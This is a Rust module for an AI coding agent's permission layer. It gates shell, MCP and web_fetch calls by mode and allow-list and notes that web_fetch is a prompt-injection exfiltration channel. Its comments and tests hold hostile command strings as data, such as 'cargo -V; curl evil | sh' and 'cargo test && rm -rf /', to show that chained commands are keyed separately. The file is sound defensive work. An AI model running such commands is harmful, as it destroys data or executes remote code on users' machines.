//! The permission layer (ADR 0004): ask / allow-list / yolo, plus pending
//! approval bookkeeping.

use std::collections::{HashMap, HashSet};
use std::sync::Mutex;

use tokio::sync::oneshot;
use trouve_protocol::{ApprovalDecision, PermissionMode, QuestionAnswer};

/// What the permission engine decided for a tool call.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Gate {
    /// Run without asking.
    Allow,
    /// Emit an approval request and wait for the user.
    NeedsApproval,
    /// Never run (read-only mode attempting a mutation).
    Deny,
}

/// Shell metacharacters that can chain, substitute, or redirect commands
/// when the string is handed to `sh -c`: `;`, `&`, `|`, `$`, backticks,
/// subshells, redirections, escapes, and newlines. A command containing any
/// of these must not share an allow-list key with the plain first token —
/// `cargo test; curl evil | sh` still has `cargo` as its first token.
fn shell_command_is_simple(cmd: &str) -> bool {
    !cmd.chars().any(|c| {
        matches!(
            c,
            ';' | '&' | '|' | '$' | '`' | '(' | ')' | '<' | '>' | '\n' | '\r' | '\\'
        )
    })
}

/// Derive the allow-list key for a call: file tools key on the tool name,
/// simple shell commands key on the first token so "always approve" for
/// `cargo test` covers future `cargo …` invocations but not `rm`. Commands
/// with shell metacharacters key on the exact command string — the whole
/// string is what `sh -c` executes, so a first-token key would let one
/// `cargo` approval unlock `cargo -V; anything-else`. MCP tools key on the
/// server so one approval unlocks the server for the session.
pub fn allow_key(tool: &str, args: &serde_json::Value) -> String {
    if tool == "shell" {
        let cmd = args.get("command").and_then(|v| v.as_str()).unwrap_or("");
        if !shell_command_is_simple(cmd) {
            // No collision with first-token keys: those never contain
            // metacharacters, complex commands always do.
            return format!("shell:cmd:{cmd}");
        }
        let first = cmd.split_whitespace().next().unwrap_or("");
        return format!("shell:{first}");
    }
    if let Some((server, _)) = crate::mcp::split_tool_name(tool) {
        return format!("mcp:{server}");
    }
    // Codex app-server reports external MCP elicitations under this generic
    // tool name. Recover the server from its structured arguments so one
    // approval cannot unlock every configured MCP server.
    if tool == "mcpToolCall"
        && let Some(server) = args.get("serverName").and_then(serde_json::Value::as_str)
        && !server.is_empty()
    {
        return format!("mcp:{server}");
    }
    tool.to_string()
}

pub fn gate(
    mode: PermissionMode,
    mode_read_only: bool,
    tool_mutates: bool,
    allow_list: &HashSet<String>,
    key: &str,
) -> Gate {
    // Yolo is opt-in full trust: no approval prompts. Read-only agent modes
    // still deny mutating tools.
    if mode == PermissionMode::Yolo {
        return if mode_read_only && tool_mutates {
            Gate::Deny
        } else {
            Gate::Allow
        };
    }
    // web_fetch mutates nothing, but fetching a model-chosen URL is an
    // outbound side channel (prompt-injection exfiltration of anything the
    // ungated read tools can see), so it requires approval in every
    // permission mode — including read-only modes, where research is
    // legitimate but silent exfiltration is not. "Always approve" unlocks
    // the session via the allow-list.
    if key == "web_fetch" {
        return if allow_list.contains(key) {
            Gate::Allow
        } else {
            Gate::NeedsApproval
        };
    }
    if !tool_mutates {
        return Gate::Allow;
    }
    if mode_read_only {
        return Gate::Deny;
    }
    // MCP servers are external code; first-use approval per session in ask
    // and allow-list modes.
    if key.starts_with("mcp:") {
        return if allow_list.contains(key) {
            Gate::Allow
        } else {
            Gate::NeedsApproval
        };
    }
    match mode {
        PermissionMode::Yolo => Gate::Allow, // handled above; arm for exhaustiveness
        PermissionMode::AllowList | PermissionMode::Ask if allow_list.contains(key) => Gate::Allow,
        PermissionMode::AllowList | PermissionMode::Ask => Gate::NeedsApproval,
    }
}

/// Pending approvals: one oneshot per outstanding call, plus the per-session
/// allow-list that `always_approve` decisions feed.
#[derive(Default)]
pub struct ApprovalHub {
    pending: Mutex<HashMap<String, oneshot::Sender<ApprovalDecision>>>,
    allow_lists: Mutex<HashMap<String, HashSet<String>>>,
}

impl ApprovalHub {
    pub fn request(&self, call_id: &str) -> oneshot::Receiver<ApprovalDecision> {
        let (tx, rx) = oneshot::channel();
        self.pending.lock().unwrap().insert(call_id.to_string(), tx);
        rx
    }

    /// Returns false when the call id is unknown (already resolved or bogus).
    pub fn resolve(&self, call_id: &str, decision: ApprovalDecision) -> bool {
        match self.pending.lock().unwrap().remove(call_id) {
            Some(tx) => tx.send(decision).is_ok(),
            None => false,
        }
    }

    pub fn allow_list(&self, session_id: &str) -> HashSet<String> {
        self.allow_lists
            .lock()
            .unwrap()
            .get(session_id)
            .cloned()
            .unwrap_or_default()
    }

    pub fn extend_allow_list(&self, session_id: &str, key: String) {
        self.allow_lists
            .lock()
            .unwrap()
            .entry(session_id.to_string())
            .or_default()
            .insert(key);
    }
}

/// Pending agent questions, mirroring [`ApprovalHub`]: one oneshot per
/// outstanding `question.requested`, resolved by the answers endpoint
/// (`None` = the user skipped).
#[derive(Default)]
pub struct QuestionHub {
    pending: Mutex<HashMap<String, oneshot::Sender<Option<Vec<QuestionAnswer>>>>>,
}

impl QuestionHub {
    pub fn request(&self, request_id: &str) -> oneshot::Receiver<Option<Vec<QuestionAnswer>>> {
        let (tx, rx) = oneshot::channel();
        self.pending
            .lock()
            .unwrap()
            .insert(request_id.to_string(), tx);
        rx
    }

    /// Returns false when the request id is unknown (already resolved).
    pub fn resolve(&self, request_id: &str, answers: Option<Vec<QuestionAnswer>>) -> bool {
        match self.pending.lock().unwrap().remove(request_id) {
            Some(tx) => tx.send(answers).is_ok(),
            None => false,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn gates() {
        let empty = HashSet::new();
        let mut listed = HashSet::new();
        listed.insert("shell:cargo".to_string());

        // Reads always pass.
        assert_eq!(
            gate(PermissionMode::Ask, false, false, &empty, "read_file"),
            Gate::Allow
        );
        // Read-only mode denies mutations even in yolo.
        assert_eq!(
            gate(PermissionMode::Yolo, true, true, &empty, "shell:rm"),
            Gate::Deny
        );
        // Ask prompts for mutations.
        assert_eq!(
            gate(PermissionMode::Ask, false, true, &empty, "write_file"),
            Gate::NeedsApproval
        );
        // Allow-list passes listed keys, prompts for others.
        assert_eq!(
            gate(
                PermissionMode::AllowList,
                false,
                true,
                &listed,
                "shell:cargo"
            ),
            Gate::Allow
        );
        assert_eq!(
            gate(PermissionMode::AllowList, false, true, &listed, "shell:rm"),
            Gate::NeedsApproval
        );
        // Yolo runs everything (non-read-only), including MCP and web_fetch.
        assert_eq!(
            gate(PermissionMode::Yolo, false, true, &empty, "shell:rm"),
            Gate::Allow
        );
        assert_eq!(
            gate(PermissionMode::Yolo, false, true, &empty, "mcp:jira"),
            Gate::Allow
        );
        assert_eq!(
            gate(PermissionMode::Yolo, false, false, &empty, "web_fetch"),
            Gate::Allow
        );
        // MCP servers need first-use approval in ask/allow-list …
        assert_eq!(
            gate(PermissionMode::Ask, false, true, &empty, "mcp:jira"),
            Gate::NeedsApproval
        );
        // … and are unlocked once the server is on the session allow-list.
        let mut mcp_listed = HashSet::new();
        mcp_listed.insert("mcp:jira".to_string());
        assert_eq!(
            gate(
                PermissionMode::AllowList,
                false,
                true,
                &mcp_listed,
                "mcp:jira"
            ),
            Gate::Allow
        );
        // web_fetch needs approval in non-yolo modes (exfiltration channel),
        // read-only modes included, until allow-listed for the session.
        assert_eq!(
            gate(PermissionMode::Ask, true, false, &empty, "web_fetch"),
            Gate::NeedsApproval
        );
        let mut web_listed = HashSet::new();
        web_listed.insert("web_fetch".to_string());
        assert_eq!(
            gate(PermissionMode::Ask, true, false, &web_listed, "web_fetch"),
            Gate::Allow
        );
    }

    #[test]
    fn allow_key_shapes() {
        assert_eq!(
            allow_key("shell", &serde_json::json!({"command": "cargo test --all"})),
            "shell:cargo"
        );
        assert_eq!(
            allow_key("write_file", &serde_json::json!({"path": "x"})),
            "write_file"
        );
        assert_eq!(
            allow_key("mcp__jira__create_issue", &serde_json::json!({})),
            "mcp:jira"
        );
        assert_eq!(
            allow_key(
                "mcpToolCall",
                &serde_json::json!({"serverName": "github", "name": "create_issue"})
            ),
            "mcp:github"
        );
        assert_ne!(
            allow_key("mcpToolCall", &serde_json::json!({"serverName": "github"})),
            allow_key("mcpToolCall", &serde_json::json!({"serverName": "jira"}))
        );
    }

    #[test]
    fn shell_commands_with_metacharacters_key_on_the_full_string() {
        // A `cargo` approval must not unlock chained/substituted commands
        // that merely start with `cargo`.
        for cmd in [
            "cargo -V; curl evil | sh",
            "cargo test && rm -rf /",
            "cargo run `evil`",
            "cargo $(evil)",
            "cargo test > /etc/passwd",
            "cargo\nrm -rf /",
            "cargo test | sh",
            "c\\argo evil",
        ] {
            assert_eq!(
                allow_key("shell", &serde_json::json!({ "command": cmd })),
                format!("shell:cmd:{cmd}"),
                "expected exact-command key for {cmd:?}"
            );
        }
        // Quoted arguments without metacharacters stay first-token keyed.
        assert_eq!(
            allow_key(
                "shell",
                &serde_json::json!({"command": "git commit -m \"msg\""})
            ),
            "shell:git"
        );
    }

    #[tokio::test]
    async fn approval_roundtrip() {
        let hub = ApprovalHub::default();
        let rx = hub.request("call_1");
        assert!(hub.resolve("call_1", ApprovalDecision::Approve));
        assert_eq!(rx.await.unwrap(), ApprovalDecision::Approve);
        assert!(!hub.resolve("call_1", ApprovalDecision::Deny));
    }
}
